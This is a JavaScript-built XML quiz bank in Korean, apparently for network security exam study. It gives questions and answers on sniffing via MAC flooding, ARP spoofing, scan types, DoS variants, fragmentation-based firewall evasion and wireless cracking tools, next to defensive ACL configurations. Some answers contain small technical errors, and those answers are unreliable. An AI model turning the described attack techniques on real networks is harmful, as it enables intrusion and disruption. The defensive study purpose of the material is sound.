xml+='  <answer id="71">분산된, 이기종 시스템간의 네트워크 상호호환을 위해&lt;br&gt;필요한 표준 아키텍처를 정의한 참조모델&lt;br&gt;</answer>';
xml+='  <problem id="72">OSI에서 각 계층의 PDU는?&lt;br&gt;</problem>';
xml+='  <answer id="72">1(물리 계층) PDU ? bit(streem)&lt;br&gt;2(데이터 링크 계층) PDU ? Frame&lt;br&gt;3(네트워크 계층) PDU ? Packet 혹은 UDP의 Datagram&lt;br&gt;4(전송 계층) PDU ? TCP segment&lt;br&gt;5-6-7 (..응용 계층) PDU ? message, data&lt;br&gt;</answer>';
xml+='  <problem id="73">1계층의 더미 허브에서 NIC의 동작모드 ( )를 하면 &lt;br&gt;자신이 목적지가 아닌 패킷도 모두 수신할 수 있다.&lt;br&gt;</problem>';
xml+='  <answer id="73">promiscuous</answer>';
xml+='  <problem id="74">Node-to-Node delivery 계층에서 오류제어, 흐름제어엔&lt;br&gt;무슨 기능이 있는가?</problem>';
xml+='  <answer id="74">흐름 제어(stop and wait, sliding window)&lt;br&gt;오류 제어(BEC-재전송요청(ARQ), FEC)</answer>';
xml+='  <problem id="75">L2 Switch를 스니핑 하는 방법에 대해 서술하시오.</problem>';
xml+='  <answer id="75">L2 Switch는 원천적으로 스니핑이 불가능하지만 &lt;br&gt;MAC Flooding(switch jamming)으로&lt;br&gt;MAC Address table의 버퍼를 overflow 시키면&lt;br&gt;스위치는 더미 허브처럼 동작하게 되므로 &lt;br&gt;스니핑이 가능해진다.</answer>';
xml+='  <problem id="76">L2 Switch 장애 시 발생 가능한 네트워크 공격과 이유를 쓰시오.</problem>';
xml+='  <answer id="76">스위치는 장비 장애 관련 보안 정책에서 Fail Safe/Open 정책을 &lt;br&gt;따르는 장비다. 공격자가 스위치에 과도한 부하를 주어&lt;br&gt;장애가 발생하면 스위치 보안 정책에 따라서 더미 허브처럼 &lt;br&gt;연결된 모든 노드에 패킷을 전송(브로드캐스팅)하여 &lt;br&gt;스니핑 공격이 발생할 수 있다.</answer>';
xml+='  <problem id="77">스위치 재밍(Switch Jamming)에 대해 설명하시오.</problem>';
xml+='  <answer id="77">스위치의 MAC Address Table의 버퍼를 오버플로우 시켜서&lt;br&gt;스위치가 허브처럼 브로드 케스팅 동작을 하게 만드는 방법이다.</answer>';
xml+='  <problem id="78">L4 Switch는 어떤 기능을 제공하는가?</problem>';
xml+='  <answer id="78">SLB(Server Load Balance) - 서버 트래픽 부하분산&lt;br&gt;여러 대의 처리 서버가 병렬로 작업을 처리하도록 하여 &lt;br&gt;각 처리기 서버에 걸리는 부하의 정도 균형을 잡아준다.&lt;br&gt;&lt;br&gt;Failover - 장애극복(시스템 대체 작동)&lt;br&gt;시스템이나 네트워크 등에 이상이 생겼을 때 &lt;br&gt;예비 시스템으로 자동 전환되는 기능이다</answer>';
xml+='  <problem id="79">SLB(Server load Banacing)에 대해 설명하시오.</problem>';
xml+='  <answer id="79">서버 로드 밸런싱의 약어로 &lt;br&gt;여러 대의 서버를 마치 하나의 서버처럼 동작시킴으로써&lt;br&gt;성능을 쉽게 확장하게 하고, 서버의 장애 발생 시에도 타 서버로&lt;br&gt;운영이 가능하게 함으로써 신뢰성을 향상하기 위한 방법이다. &lt;br&gt;</answer>';
xml+='  <problem id="80">MAC 주소(media access control address)의 구조는?&lt;br&gt;</problem>';
xml+='  <answer id="80">상위 24bit : 제조자 식별번호&lt;br&gt;하위 24bit : 벤더가 할당한 일련번호&lt;br&gt;</answer>';
xml+='  <problem id="81">윈도우에서 ARP 캐시를 확인 및 정적 설정하는 방법은?</problem>';
xml+='  <answer id="81">캐시 확인 : arp -a&lt;br&gt;정적 설정 : arp -s [ip]&lt;br&gt;</answer>';
xml+='  <problem id="82">ARP SPOOFING의 대응 방법은?</problem>';
xml+='  <answer id="82">1) ARP cache를 정적으로 설정한다. &lt;br&gt;2) arp watch와 같은 전문 소프트웨어를 이용하여 &lt;br&gt;    arp 트래픽을 실시간으로 모니터링한다.&lt;br&gt;</answer>';
xml+='  <problem id="83">Sender IP 와 Target IP가 동일한 ARP의 이름과 목적은?</problem>';
xml+='  <answer id="83">이름 : GARP( Gratuitous ARP )&lt;br&gt;목적 : IP 충돌 감지와 상대방의 ARP cache 정보를 &lt;br&gt;         갱신하기 위해 사용한다.</answer>';
xml+='  <problem id="84">Gratuitous ARP의 사용 목적은?</problem>';
xml+='  <answer id="84">1) "IP 주소 충돌"을 감지하기 위해 사용한다. &lt;br&gt;호스트에서 자신의 IP 주소를 타겟으로 하여 &lt;br&gt;ARP 요청을 보내고, 만약 다른 호스트에서 이에 대한 응답이 &lt;br&gt;있다면 이미 해당 IP 주소를 사용하고 있는 호스트가 &lt;br&gt;존재하게 되는 것이다.&lt;br&gt;&lt;br&gt;2) "ARP table을 갱신"하기 위해 사용한다.&lt;br&gt;GARP 패킷을 보내면, 이를 수신한 모든 호스트/라우터는 &lt;br&gt;GARP 패킷의 {Sender MAC address와 Sender IP address} &lt;br&gt;필드로 자신의 ARP table을 갱신한다.</answer>';
xml+='  <problem id="85">네트워크 통신을 조작하여 통신 내용을 도청 및 &lt;br&gt;조작하는 공격 기법은?</problem>';
xml+='  <answer id="85">MITM(Man In The Middle)</answer>';
xml+='  <problem id="86">TTL은 Hop count 라고도 하며, 운영체제별 ( ) 목적으로 &lt;br&gt;쓰일 수 있다. Linux, window, unix의 TTL 값은?&lt;br&gt;</problem>';
xml+='  <answer id="86">OS Fingerprinting (각각 64, 128, 255)</answer>';
xml+='  <problem id="87">OS 의 기본 설정에 따라 다른 여러 값들을 이용해서, &lt;br&gt;다른 PC 의 OS 를 알아내는 기법을 말한다. &lt;br&gt;실제 Nmap 같은 네트워크 스캐닝 툴에서 원격지 호스트의 &lt;br&gt;OS 를 판별하기 위해 사용한다.&lt;br&gt;</problem>';
xml+='  <answer id="87">OS Fingerprinting (OS 핑거프린팅)</answer>';
xml+='  <problem id="88">원본 IP 데이터 그램의 payload가 3010byte 인 경우 &lt;br&gt;단편화가 어떻게 일어나는가? (id가 2222로 가정)</problem>';
xml+='  <answer id="88">첫 번째 단편 =&gt; IPv4 HLEN=20 Total length=1500&lt;br&gt;(헤더:20+데이터부:1480) &lt;br&gt;Identification=2222 flag: 001 offset=0&lt;br&gt;&lt;br&gt;두 번째 단편 =&gt; IPv4 HLEN=20 Total length=1500&lt;br&gt;(헤더:20+데이터부:1480) &lt;br&gt;Identification=2222 flag: 001 offset=1480&lt;br&gt;&lt;br&gt;세 번째 단편 =&gt; IPv4 HLEN=20 Total length=70&lt;br&gt;(헤더:20+데이터부:50) &lt;br&gt;Identification=2222 flag: 001 offset=2960</answer>';
xml+='  <problem id="89">호스트의 라우팅 테이블 정보를 확인하는 방법은?</problem>';
xml+='  <answer id="89">netstat -rn</answer>';
xml+='  <problem id="90">라우팅 테이블 검색 방식 및 우선 순위는?</problem>';
xml+='  <answer id="90">● 검색 방식 &lt;br&gt;ip 패킷 목적지 주소와 genmask를 and 연산 후 &lt;br&gt;destination 필드와 비교한다. &lt;br&gt;&lt;br&gt;●검색 우선 순위&lt;br&gt;호스트 주소와 일치하는 경로를 찾고 없으면 목적지 네트워크와 &lt;br&gt;일치하는 경로를 찾고 그 마저 없으면 default gateway로 보낸다.&lt;br&gt;</answer>';
xml+='  <problem id="91">IPv6의 장점과 전환 기술을 쓰시오.</problem>';
xml+='  <answer id="91">● 장점 &lt;br&gt;확대된 주소 공간, 단순해진 헤더 포멧, &lt;br&gt;간편해진 주소설정, 강화된 보안성&lt;br&gt;&lt;br&gt;● 전환 기술&lt;br&gt;듀얼 스택, 터널링, 주소/헤더 변환&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;</answer>';
xml+='  <problem id="92">IPv6 기술 종류와 각각의 특징을 서술하시오.</problem>';
xml+='  <answer id="92">● 듀얼스택(Dualstack) 기술&lt;br&gt;하나의 시스템(호스트 또는 라우터)에서 &lt;br&gt;IPv4와 IPv6 프로토콜을 모두 처리하는 기술이다.&lt;br&gt;&lt;br&gt;● 터널링(Tunneling) 기술&lt;br&gt;2개의 IPv6 호스트 사이에 IPv4 망이 있을 경우에, &lt;br&gt;IPv6 패킷을 IPv4 패킷 속에 캡슐화하여 사용하는 기술이다.&lt;br&gt;&lt;br&gt;● 헤더 변환(Translation) 기술&lt;br&gt;IPv6 시스템이 IPv4 수신자가 이해할 수 있는, &lt;br&gt;또는 그 반대로 헤더를 변환하는 기술이다.</answer>';
xml+='  <problem id="93">IPv6 주소 종류와 각각의 특징을 서술하시오.&lt;br&gt;</problem>';
xml+='  <answer id="93">● 유니캐스트&lt;br&gt;하나의 송신자가 다른 하나의 수신자에게 1:1로 전송하는 방식&lt;br&gt;&lt;br&gt;● 애니캐스트&lt;br&gt;하나의 송신자가 가장 가까운 수신자에게 1:1로 전송하는 방식&lt;br&gt;&lt;br&gt;● 멀티캐스트&lt;br&gt;특정한 그룹 수신자들에게 1:N으로 전송하는 방식&lt;br&gt;</answer>';
xml+='  <problem id="94">ICMP Redirect Attack이란?</problem>';
xml+='  <answer id="94">공격자가 ICMP Type 5를 통해  라우팅 테이블을 &lt;br&gt;spoofing 하는 것이다.&lt;br&gt;( 특정 네트워크에 대한 gateway를 자신의 ip로 변경하여 &lt;br&gt;스니핑을 한다</answer>';
xml+='  <problem id="95">( )는 상위 어플리케이션/서비스/소켓을 식별하기 위한 식별자로 &lt;br&gt;( ) 기구를 통해 관리되고 있다.</problem>';
xml+='  <answer id="95">PORT, IANA(Internet Assigned Numbers Authority)</answer>';
xml+='  <problem id="96">전송계층 포트 범위에 대해 설명하시오.</problem>';
xml+='  <answer id="96">1 ~ 1023 : Well-known port&lt;br&gt;1024 ~ 49151 : registered port&lt;br&gt;49151 ~ 65535 : dynamic port&lt;br&gt;</answer>';
xml+='  <problem id="97">tcp session hijacking에서 서버와 클라이언트가 공격자의 &lt;br&gt;패킷 변조를 인지 못하고 교정을 위해 &lt;br&gt;서로 ack를 보내는 것을 뭐라하는가?</problem>';
xml+='  <answer id="97">ack storm</answer>';
xml+='  <problem id="98">리눅스에서 인터페이스 eth1에 promiscuous 모드 설정 방법과 &lt;br&gt;해제 방법은?</problem>';
xml+='  <answer id="98">설정 : ifconfig eth1 promisc&lt;br&gt;해제 : ifconfig eth1 -promisc&lt;br&gt;</answer>';
xml+='  <problem id="99">tcp connect(open), stealth scan, udp scan에 대해 설명하시오.</problem>';
xml+='  <answer id="99">- tcp connect : 완전 연결 후 RST + ACK 로 연결을 끊는 &lt;br&gt;방법이며 로그가 남는다.&lt;br&gt;&lt;br&gt;- Stealth scan&lt;br&gt;1) Tcp Syn(half-open) scan : &lt;br&gt;열려있는 경우 syn + ack 의 반응이 온다.&lt;br&gt;&lt;br&gt;2) Xmas, Null, Fin Scan : 포트가 닫혀 있는 경우 모두 &lt;br&gt;RST+ACK의 반응이 오며, 열려 있는 경우 반응이 없다. &lt;br&gt;이는 열려서 반응이 없거나 필터링 되어 반응이 없을 수 있다.&lt;br&gt;&lt;br&gt;3) udp scan : 열러 있는 경우 응답하지 않으며, &lt;br&gt;닫혀 있는 경우 Unreachable를 응답한다.&lt;br&gt;</answer>';
xml+='  <problem id="100">방화벽의 룰셋(필터링 정책)을 테스트하기 위한 스캔은?</problem>';
xml+='  <answer id="100">TCP ack scan ( packet filttering or statefull inspection f/w )</answer>';
xml+='  <problem id="101">ping of death attck에 대해 설명하시오.</problem>';
xml+='  <answer id="101">icmp 패킷을 크게 만들어 MTU에 의해 다수의 IP 단편화가 &lt;br&gt;발생하여 수신측에게 재조합(reassembly)하는 과정에서 &lt;br&gt;부하를 주는 것이다. &lt;br&gt;&lt;br&gt;대응책 : 보통 icmp는 재조합을 잘 안하기 때문에 &lt;br&gt;패킷 분할을 의심하여 탐지하며,&lt;br&gt;반복적으로 들어오는 icmp 패킷을 무시한다.</answer>';
xml+='  <problem id="102">Land attack에 대해 설명하시오.</problem>';
xml+='  <answer id="102">출발지 ip를 목적지 ip로 spoofing하는 것으로, &lt;br&gt;대응책은 출발지 ip와 목적지 ip가 동일한 경우 &lt;br&gt;방화벽에서 차단한다.&lt;br&gt;</answer>';
xml+='  <problem id="103">smurf attack에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="103">출발지 ip를 목적지 ip로 spoofing하고 &lt;br&gt;목적지 ip를 directed broadcast로 설정한다. &lt;br&gt;그리고 icmp echo request를 보내 증폭된(Amplifier network) &lt;br&gt;icmp echo reply를 target에게 보낸다. &lt;br&gt;&lt;br&gt;대응책 : 동일한 icmp echo reply가 발생하면 ips를 통해 &lt;br&gt;모두 차단시킨다. directed broadcast를 허용하지 않도록 &lt;br&gt;router를 설정한다.&lt;br&gt;</answer>';
xml+='  <problem id="104">teardrop attack에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="104">ip 패킷의 재조합 과정에서 잘못된 fragment offset 정보로 &lt;br&gt;수신시스템에 문제를 발생시키는 공격 기법이다. &lt;br&gt;대응책 : OS 보안 패치&lt;br&gt;</answer>';
xml+='  <problem id="105">침입차단시스템 우회 공격의 종류 및 원리를 서술하시오.</problem>';
xml+='  <answer id="105">● Tiny Fragment&lt;br&gt;IP fragment를 아주 작게 만들어서&lt;br&gt;패킷 필터링 장비를 우회하는 공격이다.&lt;br&gt;가령 TCP 헤더(일반적으로 20바이트)가 2개의 fragment에 &lt;br&gt;나뉘어질 정도로 작게 쪼개서 목적지 TCP 포트번호가 첫 번째&lt;br&gt;fragment에 위치하지 않고 두 번째 fragment에 위치하도록 한다. &lt;br&gt;&lt;br&gt;● Fragment Overlap&lt;br&gt;Tiny Fragment에서 발전된 기법으로&lt;br&gt;첫 조각에는 필터 장비에서 허용하는 예를 들면 80포트를 가진다. &lt;br&gt;그리고 두 번째 조각에는 offset을 아주 작게 하여&lt;br&gt;재 조합 시, 두번 째 조각을 첫 번째 조각의 &lt;br&gt;일부분을 덮어쓰게 하여 우회한다.&lt;br&gt;일반적으로 첫 조각의 포트 번호를 포함하여 덮어쓴다.</answer>';
xml+='  <problem id="106">봇넷에 감염된 pc를 해독해주는 서비스에 대해 설명하시오.</problem>';
xml+='  <answer id="106">Kisa에서 제공하는 DNS Sinkhole service로서&lt;br&gt;원리는 봇넷이 C&amp;C 서버에 접속하면 &lt;br&gt;DNS 서버에서 싱크홀 서버의 IP를 반환한다.&lt;br&gt;따라서 봇넷은 악성 서버가 아닌 싱크홀 서버에 접속하여&lt;br&gt;해커에 명령을 전달받지 못한다.</answer>';
xml+='  <problem id="107">봇넷 명령 제어 방식 2가지를 설명하시오.</problem>';
xml+='  <answer id="107">● 중앙 집중형 명령/제어 방식&lt;br&gt;1대 혹은 다수의 서버로 구성되어, &lt;br&gt;감염된 PC에서 발생하는 봇들이 한 장소에 모여서 &lt;br&gt;봇마스터로부터 명령을 받는 방식이다. &lt;br&gt;대표적으로 IRC(Internet Relay Chatting) 프로토콜을 &lt;br&gt;이용한 방식과 HTTP 프로토콜을 이용하는 웹 기반 방식이 있다.&lt;br&gt;&lt;br&gt;● 분산형 명령/제어 방식(P2P 봇넷)&lt;br&gt;서버가 존재하지 않는 Peer-to-Peer (P2P) 프로토콜을 &lt;br&gt;이용하는 방식으로 중앙집중형 보다는 복잡하고 사용하기 &lt;br&gt;어려운 점이 있지만 탐지가 어렵고 비록 탐지가 되더라도 &lt;br&gt;중앙서버가 없기 때문에 봇넷이 동작을 못하게 할 수 없다.</answer>';
xml+='  <problem id="108">tcp syn flooding 공격에 대해 설명하시오. </problem>';
xml+='  <answer id="108">3-way handshake의 취약점을 이용하는 공격으로 &lt;br&gt;공격자가 다량의 ip spoofing을 하여 target server에 &lt;br&gt;syn packet을 보내는 것이다. &lt;br&gt;backlog queue를 모두 소진시켜 &lt;br&gt;서비스가 불가능한 상태를 만든다.</answer>';
xml+='  <problem id="109">http get flooding에 대해 설명하시오. </problem>';
xml+='  <answer id="109">http get flooding은 동일한 동적 컨텐츠에 대한 &lt;br&gt;http get 요청을 다량으로 발생시키는 것이다.</answer>';
xml+='  <problem id="110">서비스 거부 공격 중 &lt;br&gt;임계치 우회를 위해 요청 url을 변경하는 것은?</problem>';
xml+='  <answer id="110">hulk dos</answer>';
xml+='  <problem id="111">Hulk Dos의 대응 방안은?</problem>';
xml+='  <answer id="111">1. 동일 IP의 연결 수를 제한한다.&lt;br&gt;2. connection Timeout 값을 작게 설정한다.&lt;br&gt;3. 서비스 대상 장비 OS 업데이트 및 패치를 한다.&lt;br&gt;4. 불필요한 서비스 포트를 차단한다.</answer>';
xml+='  <problem id="112">awk 명령어를 통해 access_log 파일에 get /home/index.php가 &lt;br&gt;들어간 행을 숫자형태의 내림차순, 중복을 제거하여 &lt;br&gt;출력하는 방법은?</problem>';
xml+='  <answer id="112">cat access_log | grep "get /home/index.php" | &lt;br&gt;awk \'{print $1}\' | sort | uniq -c | sort -rn&lt;br&gt;</answer>';
xml+='  <problem id="113">웹 서버는 파라미터를 효율적으로 저장&amp;검색하기위해 &lt;br&gt;해시 테이블을 이용하는데 공격자가 이를 이용하여 &lt;br&gt;대량의 파라미터를 post 방식으로 웹 서버로 전달하는 공격은?</problem>';
xml+='  <answer id="113">hash dos attack</answer>';
xml+='  <problem id="114">slow attack 3가지에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="114">slow http header/post/read attak 3가지가 있다. &lt;br&gt;&lt;br&gt;header(slowloris)는 요청헤더의 끝인 empty line을 &lt;br&gt;전달하지 않고 천천히 불필요한 헤더 정보만을 전달하여 &lt;br&gt;연결을 지속 시켜 웹 서버의 연결 자원 가용량을 &lt;br&gt;소진 시키는 것이다. &lt;br&gt;&lt;br&gt;post(rudy)는 post방식으로 메시지를 전달하며, &lt;br&gt;content-length헤더 필드와 전송 데이터를 조작하여 &lt;br&gt;서비스 거부 공격을 수행한다. &lt;br&gt;&lt;br&gt;read는 http 요청을 보낸 후&lt;br&gt;window=0으로 설정하여 연결을 지속시키는 공격이다.</answer>';
xml+='  <problem id="115">slow http header/post/read attak 대응 방안을 서술하시오.</problem>';
xml+='  <answer id="115">1) 동시에 연결할(동일한 source ip에 대해) 임계치를 설정한다.&lt;br&gt;-&gt; iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j drop&lt;br&gt;&lt;br&gt;2) 연결 타임아웃 설정 &lt;br&gt;ex) httpd.conf =&gt; timeout 5 (apache)&lt;br&gt;&lt;br&gt;3) 읽기 타임아웃 설정 &lt;br&gt;ex) RequestReadTimeout header=5 body=10</answer>';
xml+='  <problem id="116">DRDoS에 대해 설명하시오.</problem>';
xml+='  <answer id="116">출발지 IP를 target ip로 spoofing하여 다수의 반사서버로 &lt;br&gt;요청정보를 전송하고 target은 반사서버로 부터 &lt;br&gt;다수의 응답을 받아 서비스 거부 상태가 되는 것이다.&lt;br&gt;특징은 공격 근원지 파악이 어려우며,&lt;br&gt;좀비 pc 공격 효율이 증가한다.</answer>';
xml+='  <problem id="117">DDOS와 DRDOS의 차이점은?</problem>';
xml+='  <answer id="117">DDoS가 공격 에이전트(좀비)를 감염시켜 한 곳으로 &lt;br&gt;대량의 트래픽을 집중시키는 반면, DRDoS는 외부의 정상적인 &lt;br&gt;서버들을 이용하여 공격을 수행하기 때문에 &lt;br&gt;해커들이 자기 자신을 쉽게 숨길 수 있고 &lt;br&gt;공격력을 향상 시킬 수 있어 추적과 방어가 매우 어렵다. &lt;br&gt;</answer>';
xml+='  <problem id="118">DRDOS 대응방안은?</problem>';
xml+='  <answer id="118">1. N/W에서 IP 주소가 위조된 패킷이 들어오지 못하게 &lt;br&gt;Ingress 필터링한다.&lt;br&gt;&lt;br&gt;2. 반사서버 대응 - ICMP가 필요 없는 경우 스위치 or 서버에&lt;br&gt;ICMP 프로토콜 차단하게 한다.&lt;br&gt;&lt;br&gt;3. 희생자의 대응&lt;br&gt;ICMP 프로토콜 미사용 시 ICMP 프로토콜을 차단한다.&lt;br&gt;&lt;br&gt;4. 내부 사용자용 DNS 서버 사용시 내부 사용자만 &lt;br&gt;Recursive Query 가능하게 한다.&lt;br&gt;&lt;br&gt;5. 특정 byte 이상 질의 DNS 응답 차단, &lt;br&gt;초당 DNS 응답 개수 제한을 둔다.</answer>';
xml+='  <problem id="119">내부 보안정책에 따른 허가를 받지 않고 임의로 설정한 AP란?&lt;br&gt;</problem>';
xml+='  <answer id="119">Rogue AP</answer>';
xml+='  <problem id="120">BSS의 존재를 정기적으로 알리는 브로드 캐스트 &lt;br&gt;프레임/메시지로 스테이션으로 하여금 무선 네트워크를 찾도록 &lt;br&gt;도와주는 역할을 하는 것은?&lt;br&gt;</problem>';
xml+='  <answer id="120">Beacon</answer>';
xml+='  <problem id="121">안전한 무선랜 환경을 구축하기 위해서는 무선 패킷에 대한 &lt;br&gt;기밀성과 무결성을 보장하기 위한 ( )과 통신 상대방에 대한 &lt;br&gt;신뢰성을 확인하기 위한 ( )이 필요하다.&lt;br&gt;</problem>';
xml+='  <answer id="121">무선전송 데이터 암호기술, 무선랜 접속 인증기술&lt;br&gt;</answer>';
xml+='  <problem id="122">무선전송 데이터 암호기술, 무선랜 접속 인증기술 종류를&lt;br&gt;서술하시오.</problem>';
xml+='  <answer id="122">● 무선전송 데이터 암호기술 &lt;br&gt;WEP, WPA1, WPA2 &lt;br&gt;&lt;br&gt;● 무선랜 접속 인증기술&lt;br&gt;SSID 숨김 설정, MAC 주소 인증, PSK, IEEE 802.1x/EAP</answer>';
xml+='  <problem id="123">WEP는 ( )와 ( )를 조합한 키를 이용한 ( )를 제공하고 &lt;br&gt;서로 같은 공유키를 갖는 사용자들을 정상적인 사용자로 &lt;br&gt;인증하여 통신하는 ( )을(를) 제공한다.</problem>';
xml+='  <answer id="123">고정된 공유키, 무작위로 생성한 초기 벡터, &lt;br&gt;RC4, 알고리즘 기반의 데이터 암호화&lt;br&gt;</answer>';
xml+='  <problem id="124">WEP의 문제점과 인증 문제를 서술하시오.</problem>';
xml+='  <answer id="124">짧은 초기벡터(IV) 사용으로 재사용 가능성이 높다. &lt;br&gt;불완전한 RC4 암호 알고리즘 사용으로 암호키 노출 가능성이 높다. &lt;br&gt;&lt;br&gt;단방향 인증이기 때문에 Rogue AP 식별이 불가능하고, &lt;br&gt;고정된 공유키 사용으로 취약하다.&lt;br&gt;</answer>';
xml+='  <problem id="125">IEEE 802.11i 보안 표준에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="125">● 암호 방식 &lt;br&gt;WPA1 =&gt; RC4_TKIP WPA2 = &gt; AES-CCMP&lt;br&gt;&lt;br&gt;● 인증 방식 &lt;br&gt;개인 =&gt; PSK 모드 기업 =&gt; 802.1x/EAP 모드</answer>';
xml+='  <problem id="126">무선랜에 대한 패킷 모니터링, 크래킹, 분석도구 등이 &lt;br&gt;탑재된 소프트웨어는?&lt;br&gt;</problem>';
xml+='  <answer id="126">aircrack-ng&lt;br&gt;</answer>';
xml+='  <problem id="127">무선랜 인터페이스 정보를 확인하는 명령어는?</problem>';
xml+='  <answer id="127">iwconfig</answer>';
xml+='  <problem id="128">모든 무선 패킷을 수신할 수 있는 모드 명령은? &lt;br&gt;</problem>';
xml+='  <answer id="128">airmon-ng start [인터페이스명]</answer>';
xml+='  <problem id="129">무선 AP 물리적/관리적 보안에 대해 쓰시오.</problem>';
xml+='  <answer id="129">SSID 변경, 브로드 캐스트 금지, &lt;br&gt;Default password 변경, 물리적 접근 제한&lt;br&gt;</answer>';
xml+='  <problem id="130">VPN 2~4계층 프로토콜 종류를 쓰시오.&lt;br&gt;</problem>';
xml+='  <answer id="130">2계층 : PPTP, L2F,L2TP &lt;br&gt;3계층 : IP Sec &lt;br&gt;4계층 : SSL/TLS&lt;br&gt;</answer>';
xml+='  <problem id="131">IPSec이란?&lt;br&gt;</problem>';
xml+='  <answer id="131">종단 노드 구간 또는 보안/터널 게이트웨이 구간에 &lt;br&gt;IP 패킷 보안 서비스를 제공해주는 네트워크 계층 프로토콜이다.&lt;br&gt;</answer>';
xml+='  <problem id="132">IPSec 보안 서비스 6가지에 대해 설명하시오.</problem>';
xml+='  <answer id="132">1) 기밀성 &lt;br&gt;2) 비연결형 무결성(MAC을 통해 각 IP 패킷별로 무결성 보장) &lt;br&gt;3) 데이터 원천 인증/ 송신처 인증 (MAC)&lt;br&gt;4) 재전송 공격 방지- Sequence Number &lt;br&gt;5) 접근제어 - SP(Bypass, protect) &lt;br&gt;6) 제한된 트래픽 흐름의 기밀성 (ESP의 터널모드 등)&lt;br&gt;</answer>';
xml+='  <problem id="133">IPSec 동작 모드 2가지에 대해 설명하시오.</problem>';
xml+='  <answer id="133">1) 전송 모드&lt;br&gt;종단 노드(End Point) 구간의 IP 패킷 페이로드를 보호한다.&lt;br&gt;&lt;br&gt;2) 터널 모드&lt;br&gt;패킷 전체를 보호한다. IP-H 까지 보호하기 때문에 &lt;br&gt;보안/터널/VPN 게이트웨이 주소 정보를 담는 NEW IP헤더를&lt;br&gt;추가한다. &lt;br&gt;</answer>';
xml+='  <problem id="134">AH 프로토콜의 터널 모드와 전송 모드 인증 범위의 &lt;br&gt;차이에 대해 설명하시오.</problem>';
xml+='  <answer id="134">전송모드는 IP 패킷 헤더의 전송 중 변경 가능한 필드를 제외하고&lt;br&gt;IP 패킷 전체를 인증한다.&lt;br&gt;&lt;br&gt;터널모드는 새 IP 패킷 헤더의 전송 중 변경 가능한 필드를 &lt;br&gt;제외하고 새 IP 패킷 전체를 인증한다.&lt;br&gt;</answer>';
xml+='  <problem id="135">ESP 프로토콜 동작모드에 대해 설명하시오.</problem>';
xml+='  <answer id="135">전송모드는 IP 페이로드와 ESP 트레일러를 암호화하고 &lt;br&gt;암호화된 데이터와 ESP 헤더를 인증한다. &lt;br&gt;&lt;br&gt;터널 모드는 IP 패킷 전체와 ESP 트레일러를 암호화하고&lt;br&gt;암호화된 데이터와 ESP 헤더를 인증한다.&lt;br&gt;&lt;br&gt; &lt;br&gt;</answer>';
xml+='  <problem id="136">ipsec에서 둘 사이에 논리적인 연결 상태를 유지하는 동안&lt;br&gt;적용할 보안 설정 정보를 결정하는 과정을 무엇이라 하는가?</problem>';
xml+='  <answer id="136">보안협상(Security Association)</answer>';
xml+='  <problem id="137">ipsec vpn에서 &lt;br&gt;보안 관련 설정들을 생성하고 협상 및 관리하는 프로토콜은?&lt;br&gt;</problem>';
xml+='  <answer id="137">IKE(Internet Key Exchange) - 포트 500/UDP&lt;br&gt;</answer>';
xml+='  <problem id="138">SSL/TLS란?</problem>';
xml+='  <answer id="138">클라이언트/서버 환경에서 TCP 기반의 Application에 대한 &lt;br&gt;종단간 보안서비스를 제공하기 위해 만들어진 프로토콜이다.</answer>';
xml+='  <problem id="139">SSL/TLS 프로토콜 스택 구성 프로토콜을 서술하시오.&lt;br&gt;</problem>';
xml+='  <answer id="139">● 상위 계층&lt;br&gt;handshake, change Cipher spec, Alert, Application Data&lt;br&gt;&lt;br&gt;● 하위 계층&lt;br&gt;Record&lt;br&gt;</answer>';
xml+='  <problem id="140">SSL/TLS에서 서버의 개인키가 노출되어도 &lt;br&gt;이전 트래픽 정보의 기밀성은 그대로 유지되는 암호학적 성질은?&lt;br&gt;</problem>';
xml+='  <answer id="140">PFS(Perfect Foward Secrecy)</answer>';
xml+='  <problem id="141">라우터에서 Privileged 모드로 변경할 때 &lt;br&gt;사용하는 password 설정 방법은?&lt;br&gt;</problem>';
xml+='  <answer id="141">enable password [사용할 암호] </answer>';
xml+='  <problem id="142">ICMP MTU Discovery 허용을 위한 ACL 정책을 설정하시오.&lt;br&gt;</problem>';
xml+='  <answer id="142">access-list 103 permit icmp any any 3 4&lt;br&gt;access-list 103 deny icmp any any&lt;br&gt;access-list permit ip any any&lt;br&gt;interface FastEthernet 0/0&lt;br&gt;ip access-group 103 in&lt;br&gt;end&lt;br&gt;</answer>';
xml+='  <problem id="143">외부에서 내부로 유입되는 ip가 내부 ip 주소라면 &lt;br&gt;악용된 것이라 보면된다. &lt;br&gt;내부 ip가 130.18.0.0 인 경우 ACL 정책을 설정하시오.&lt;br&gt;(FastEthernet = 0/0)</problem>';
xml+='  <answer id="143">access-list 50 deny 130.18.0.0 0.0.255.255&lt;br&gt;access-list 50 permit any&lt;br&gt;interface FastEthernet 0/0&lt;br&gt;ip access-group 50 in&lt;br&gt;end&lt;br&gt;</answer>';
xml+='  <problem id="144">acl을 이용하여 내부 네트워크 IP 주소를 가진 패킷만 &lt;br&gt;라우터로부터 나가는 것을 허용하고 나머지는 차단하도록 &lt;br&gt;설정하라. (내부 IP 주소 130.80.0.0, NIC = FastEthernet0/0)</problem>';
xml+='  <answer id="144">access-list 50 permit 130.80.0.0 0.0.255.255&lt;br&gt;access-list 50 deny any&lt;br&gt;interface FastEthernet 0/0&lt;br&gt;ip access-group 50 out&lt;br&gt;end&lt;br&gt;</answer>';
xml+='  <problem id="145">reverse path가 존재하지 않으면 &lt;br&gt;그 ip 주소를 출발지 주소가 위조된 패킷으로 판단하고 &lt;br&gt;차단하는 방법은? ( FastEthernet 0/0 )</problem>';
xml+='  <answer id="145">unicast RPF&lt;br&gt;interface FastEthernet 0/0&lt;br&gt;ip verify unicast reverse-path&lt;br&gt;end&lt;br&gt;</answer>';
xml+='  <problem id="146">DDoS 공격에 대한 대응 방법으로 특정 목적지로 &lt;br&gt;DDoS 공격에 의해 네트워크 트래픽이 과도하게 발생할 경우&lt;br&gt;해당 목적지 ip를 망내에서 통신할 수 없도록 차단하는 방법은? &lt;br&gt;(211.1.1.2를 차단)</problem>';
xml+='  <answer id="146">interface null 0&lt;br&gt;no ip unreachables&lt;br&gt;exit&lt;br&gt;ip route 211.1.1.2 255.255.255.255 null 0&lt;br&gt;end&lt;br&gt;</answer>';
